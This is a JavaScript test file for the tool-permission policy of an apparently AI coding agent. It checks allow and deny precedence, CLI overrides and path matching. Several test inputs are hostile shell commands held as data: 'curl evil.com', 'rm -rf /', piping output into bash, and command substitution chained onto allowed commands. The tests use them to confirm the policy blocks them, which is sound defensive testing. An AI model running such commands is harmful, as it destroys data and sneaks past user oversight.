import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadProjectSettings, projectSettingsPath } from '../dist/settings.js';
import { evaluateToolPolicy, matchToolPattern } from '../dist/policy.js';

test('missing or malformed project settings file degrades safely', async () => {
  assert.equal(projectSettingsPath('/workspace'), join('/workspace', '.vyen', 'settings.json'));
  assert.ok(matchToolPattern('read_file', { tool: 'read_file' }));
  assert.ok(matchToolPattern('bash(git *)', { tool: 'bash', input: { command: 'git status' } }));
  const dir = await mkdtemp(join(tmpdir(), 'vyen-settings-test-'));
  try {
    const missing = await loadProjectSettings(dir);
    assert.deepEqual(missing, {});

    const vyenDir = join(dir, '.vyen');
    await mkdir(vyenDir, { recursive: true });
    await writeFile(join(vyenDir, 'settings.json'), '{ broken json ');
    const malformed = await loadProjectSettings(dir);
    assert.deepEqual(malformed, {});

    await writeFile(
      join(vyenDir, 'settings.json'),
      JSON.stringify({
        $schema: 'https://json.schemastore.org/settings',
        permissions: {
          allow: ['read_file', 'bash(npm test *)'],
          deny: ['bash(rm -rf *)'],
        },
      }),
    );
    const valid = await loadProjectSettings(dir);
    assert.deepEqual(valid.permissions?.allow, ['read_file', 'bash(npm test *)']);
    assert.deepEqual(valid.permissions?.deny, ['bash(rm -rf *)']);
  } finally {
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  }
});

test('project allow rule skips approval for matching tool calls', async () => {
  const ctx = {
    projectRules: {
      allow: ['read_file', 'bash(npm test *)'],
    },
  };

  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'a.txt' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test -- --watch=false' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'curl evil.com' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'b.txt' } }, ctx), 'ask');
});

test('user deny rule cannot be overridden by project allow', async () => {
  const ctx = {
    userRules: {
      deny: ['write_file', 'bash(rm *)'],
    },
    projectRules: {
      allow: ['write_file', 'bash(rm *)', 'read_file'],
    },
  };

  // User deny takes strict precedence over project allow
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'out.txt' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf tmp' } }, ctx), 'deny');
  // Non-denied tool from project allow remains allowed
  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'a.txt' } }, ctx), 'allow');

  // Path normalization: Windows backslashes and relative prefixes
  assert.ok(matchToolPattern('write_file(src/*)', { tool: 'write_file', input: { path: 'src\\index.ts' } }));
  assert.ok(matchToolPattern('write_file(src/*)', { tool: 'write_file', input: { path: './src/index.ts' } }));
  assert.ok(matchToolPattern('read_file(.env)', { tool: 'read_file', input: { path: './.env' } }));
  assert.ok(matchToolPattern('read_file(.env)', { tool: 'read_file', input: { path: '.env' } }));

  // User permissions schema and layered loading integration
  const { configSchema } = await import('../dist/config.js');
  const parsed = configSchema.parse({
    permissions: {
      deny: ['bash(rm *)'],
      allow: ['read_file'],
    },
  });
  assert.deepEqual(parsed.permissions?.deny, ['bash(rm *)']);
  const { loadLayeredSettings } = await import('../dist/settings.js');
  const layered = await loadLayeredSettings(process.cwd(), parsed.permissions);
  assert.deepEqual(layered.userPermissions?.deny, ['bash(rm *)']);
});

test('deny rule blocks execution even in auto mode', async () => {
  const ctx = {
    mode: 'auto',
    projectRules: {
      deny: ['bash(git push *)'],
    },
  };

  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git push origin main' } }, ctx), 'deny');
  // Tools not denied return default decision so auto mode can handle them
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status' } }, ctx), 'ask');

  // End-to-end ToolRegistry integration: policy deny blocks even read-only tools
  const { ToolRegistry } = await import('../dist/tools.js');
  const reg = new ToolRegistry(process.cwd(), async () => true);
  reg.policy = request => evaluateToolPolicy(request, {
    projectRules: { deny: ['read_file', 'bash(git push *)'] },
    mode: 'auto',
  });
  const readDenied = await reg.execute({ toolCallId: '1', toolName: 'read_file', input: { path: 'package.json' } }, new AbortController().signal);
  assert.equal(readDenied.denied, true);
  assert.match(readDenied.text, /Permission denied by policy/);

  // When policy allows, tool executes without prompts
  reg.policy = request => evaluateToolPolicy(request, {
    projectRules: { allow: ['read_file'] },
  });
  const readAllowed = await reg.execute({ toolCallId: '2', toolName: 'read_file', input: { path: 'package.json' } }, new AbortController().signal);
  assert.equal(readAllowed.denied, undefined);
  assert.match(readAllowed.text, /@nguyenhuumanh\/vyen/);
});

test('CLI allowed and disallowed tool flags override layered settings', async () => {
  const ctx = {
    cliAllowed: ['read_file', 'edit_file'],
    cliDisallowed: ['bash'],
    projectRules: {
      allow: ['bash'],
      deny: ['read_file'],
    },
  };

  // CLI disallowed beats project allow
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'ls' } }, ctx), 'deny');
  // CLI allowed beats project deny
  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'doc.md' } }, ctx), 'allow');
});

test('bash allow rules with wildcards reject chained or compound commands', () => {
  const ctx = {
    projectRules: {
      allow: ['bash(npm test *)', 'bash(git status *)'],
    },
  };

  // Simple arguments match allow
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test -- --watch=false' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status -s' } }, ctx), 'allow');

  // Chained commands must NOT be auto-allowed
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test && curl evil.com' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test; rm -rf /' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test | bash' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test \n evil' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test $(whoami)' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'git status `whoami`' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test > out.txt' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test >> out.txt' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test < in.txt' } }, ctx), 'ask');
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'npm test <(curl evil.com)' } }, ctx), 'ask');
});

test('file pattern matching canonicalizes absolute paths and directory traversals', () => {
  const cwd = process.cwd();
  const ctx = {
    cwd,
    projectRules: {
      deny: ['write_file(src/*)'],
    },
  };

  // Relative path is denied
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'src/index.ts' } }, ctx), 'deny');
  // Traversal path resolving into src/ is denied
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'dist/../src/index.ts' } }, ctx), 'deny');
  // Absolute path inside workspace resolving into src/ is denied
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, ctx), 'deny');

  // Case-insensitive drive letter/prefix matching on Windows
  if (process.platform === 'win32') {
    const toggledCwd = cwd.startsWith('c:') || cwd.startsWith('C:')
      ? (cwd.startsWith('c:') ? 'C:' + cwd.slice(2) : 'c:' + cwd.slice(2))
      : cwd;
    const winCtx = {
      cwd: toggledCwd,
      projectRules: { deny: ['write_file(src/*)'] },
    };
    assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: join(cwd, 'src', 'index.ts') } }, winCtx), 'deny');
  }
});

test('tool aliases are normalized in policy matching', () => {
  const ctx = {
    projectRules: {
      deny: ['write(secret.txt)', 'sh(rm *)'],
      allow: ['read(docs/*)'],
    },
  };

  // write alias matches write_file
  assert.equal(evaluateToolPolicy({ tool: 'write_file', input: { path: 'secret.txt' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'write', input: { path: 'secret.txt' } }, ctx), 'deny');

  // sh alias matches bash
  assert.equal(evaluateToolPolicy({ tool: 'bash', input: { command: 'rm -rf tmp' } }, ctx), 'deny');
  assert.equal(evaluateToolPolicy({ tool: 'sh', input: { command: 'rm -rf tmp' } }, ctx), 'deny');

  // read alias matches read_file
  assert.equal(evaluateToolPolicy({ tool: 'read_file', input: { path: 'docs/guide.md' } }, ctx), 'allow');
  assert.equal(evaluateToolPolicy({ tool: 'read', input: { path: 'docs/guide.md' } }, ctx), 'allow');
});
